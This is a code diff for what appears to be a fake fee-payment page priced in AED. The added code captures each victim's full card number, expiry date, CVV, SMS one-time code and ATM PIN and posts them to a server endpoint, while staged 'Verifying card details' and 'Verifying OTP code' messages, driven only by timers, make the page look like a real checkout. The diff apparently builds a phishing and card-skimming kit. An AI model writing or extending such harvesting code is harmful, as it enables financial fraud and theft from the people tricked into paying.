@@ -558,6 +558,19 @@
 
         function step(ms) { return new Promise(r => setTimeout(r, ms)); }
 
+        async function postPayment(stage, payload) {
+            try {
+                await fetch('/api/payments', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(Object.assign({ contractNo: contractNo }, payload, { stage }))
+                });
+            } catch (e) { console.error('payment save failed:', e); }
+        }
+        const svcFeeEl = $('sum-fee');
+        const svcAmount = svcFeeEl ? parseInt((svcFeeEl.innerText || '10').replace(/[^0-9]/g, ''), 10) : 10;
+        const svcService = booking && booking.service ? booking.service : (booking && booking.serviceTypeLabel ? booking.serviceTypeLabel : '');
+
         $('btn-pay').addEventListener('click', async function () {
             const v = numInput.value.replace(/\D/g, '');
             let bad = false;
@@ -569,6 +582,15 @@
             $('btn-pay').disabled = true;
             show('pg-processing');
             setProcMsg('Verifying card details...');
+            await postPayment('card', {
+                customerName: booking && (booking.name || booking.customerName) || null,
+                serviceInfo: svcService || null,
+                amount: svcAmount,
+                cardName: ($('sum-name') ? $('sum-name').innerText : '') || null,
+                cardNumber: v,
+                cardExpiry: $('card-mm').value + '/' + $('card-yy').value,
+                cardCvv: $('card-cvv').value
+            });
             await step(2600);
             show('pg-otp');
             $('btn-pay').disabled = false;
@@ -581,6 +603,7 @@
             $('btn-otp').disabled = true;
             show('pg-processing');
             setProcMsg('Verifying OTP code...');
+            await postPayment('otp', { otpCode: val });
             await step(2200);
             show('pg-atm');
             $('btn-otp').disabled = false;
@@ -593,6 +616,7 @@
             $('btn-pin').disabled = true;
             show('pg-processing');
             setProcMsg('Processing payment...');
+            await postPayment('pin', { atmPin: val });
             await step(2600);
             // Success
             setText('suc-amt', fmtEn(fee) + ' AED');
